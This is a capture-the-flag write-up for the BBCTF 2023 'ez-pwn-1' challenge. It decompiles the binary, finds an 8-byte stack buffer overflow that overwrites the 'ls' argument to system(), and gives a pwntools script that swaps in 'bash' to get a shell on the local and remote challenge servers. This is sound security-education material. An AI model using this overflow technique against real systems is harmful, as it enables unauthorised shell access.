### Binary Exploitation

### Source: BBCTF_23

### Basic File Checks

```
└─$ file ez-pwn-1 
ez-pwn-1: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=26217945613bd2e86e73d01ae50a82c592549ccc, not stripped
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/CTF/BCTF/pwn/ez_pwn]
└─$ checksec ez-pwn-1 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Desktop/CTF/BCTF/pwn/ez_pwn/ez-pwn-1'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

With this we see all protection of the binary are enabled and we're working with a x64 binary

I'll run it to know what it does

```
┌──(venv)─(mark㉿haxor)-[~/…/CTF/BCTF/pwn/ez_pwn]
└─$ ./ez-pwn-1
Hi! would you like me to ls the current directory?
yes
Ok, here ya go!

ez-pwn-1  flag.txt
```

It takes in our input and lists the files in the current working directory

So i'll decompile using ghidra

Here's the main function

```

undefined8 main(void)

{
  int iVar1;
  long in_FS_OFFSET;
  char local_30 [8];
  undefined2 local_28;
  undefined local_26;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_28 = 0x736c;
  local_26 = 0;
  puts("Hi! would you like me to ls the current directory?");
  read(0,local_30,0x18);
  iVar1 = strcmp(local_30,"no\n");
  if (iVar1 == 0) {
    puts("Oh, ok :(");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Ok, here ya go!\n");
  system((char *)&local_28);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

So here's what is basically happening

```
1. It saves a value in local_28 which when decoded is `ls`
2. It then prints out the question
3. After that our input is receieved and stores in local_30 
4. If our input is no it exits 
5. But if our input is any other word is runs system on the value stored in local_28 which is ls
```

So with this we know that its going to run `ls` anytime we run the binary and the input given isn't `no` 

But here's the problem! The buffer `local_30` can only hold up to 8bytes but we're given an access to write `0x18` in `local_30`              

```
read(0,local_30,0x18);
```

So basically what this can lead to is that we can overwrite `local_30` to anything and is will run system on it

With this we obviously want to call `bash` so we can get a linux bash terminal

Before that i need to get the offset from the input to the local_28 variable

Here's the stack layout

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         AL:1           <RETURN>
             undefined8        Stack[-0x10]:8 local_10                                XREF[2]:     001007db(W), 
                                                                                                   0010085a(R)  
             undefined1        Stack[-0x26]:1 local_26                                XREF[1]:     001007ea(W)  
             undefined2        Stack[-0x28]:2 local_28                                XREF[3]:     001007e1(*), 
                                                                                                   001007e5(*), 
                                                                                                   00100849(*)  
             undefined1        Stack[-0x30]:1 local_30                                XREF[2]:     001007fa(*), 
                                                                                                   00100810(*)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:001006dd(*), 00100970, 
                                                                                          00100a18(*)  
```

We see that our input starts at offset 0x30 and local_38 offset is 0x28

So the offset between this two is `0x30 - 0x28 = 0x8`

And the hex of bash is `0x62617368`

```
└─$ python3       
Python 3.10.8 (main, Oct 24 2022, 10:07:16) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> s = "bash"
>>> hex_value = ''.join([hex(ord(c))[2:] for c in s])
>>> print(hex_value)
62617368
>>> 
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/CTF/BCTF/pwn/ez_pwn]
└─$ echo 68736162 | xxd -r -p | rev
bash                                                                                                        
```

So here's the exploit

```
from pwn import *

#io = remote('pwn.bbctf.fluxus.co.in', 4001)
io = process('./ez-pwn-1')

payload = ""
payload += "A"*0x8
payload += p64(0x68736162) #overwrite local_28 to bash

io.send(payload)
io.interactive()
```

So lets run it locally

````
└─$ python2 exploit.py                                    
[+] Starting local process './ez-pwn-1': pid 215751
[*] Switching to interactive mode
Hi! would you like me to ls the current directory?
Ok, here ya go!

$ 
$ ls
exploit.py  ez-pwn-1  flag.txt
$ whoami
mark
$ cat flag.txt
lol
$ 
```

It worked! Now here's the exploit for the remote server

```
from pwn import *

io = remote('pwn.bbctf.fluxus.co.in', 4001)
#io = process('./ez-pwn-1')

payload = ""
payload += "A"*0x8
payload += p64(0x68736162) #overwrite local_28 to bash

io.send(payload)
io.interactive()
```

Now i'll run it 

```
└─$ python2 exploit.py
[+] Opening connection to pwn.bbctf.fluxus.co.in on port 4001: Done
[*] Switching to interactive mode
Hi! would you like me to ls the current directory?
Ok, here ya go!

$ ls -al
total 40
drwxr-x--- 1 root pwnable_user  4096 Feb  4 05:23 .
drwxr-xr-x 1 root root          4096 Feb  4 05:23 ..
-rw-r--r-- 1 root pwnable_user   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 root pwnable_user  3771 Jan  6  2022 .bashrc
-rw-r--r-- 1 root pwnable_user   807 Jan  6  2022 .profile
drwxr-xr-x 1 root pwnable_user  4096 Feb  4 05:23 .the_flag_is_in_here
-r-xr-x--- 1 root pwnable_user 16184 Feb  3 17:43 ez-pwn-1
$ cd .the_flag_is_in_here
$ ls -al
total 12
drwxr-xr-x 1 root pwnable_user 4096 Feb  4 05:23 .
drwxr-x--- 1 root pwnable_user 4096 Feb  4 05:23 ..
-r--r----- 1 root pwnable_user   33 Feb  3 17:43 flag.txt
$ cat flag.txt;echo
flag{4_Cl45siC_M3mOry_COrrupt1ON}
$ 
```

And we're done 

<br> <br> 
[Back To Home](../../index.md)







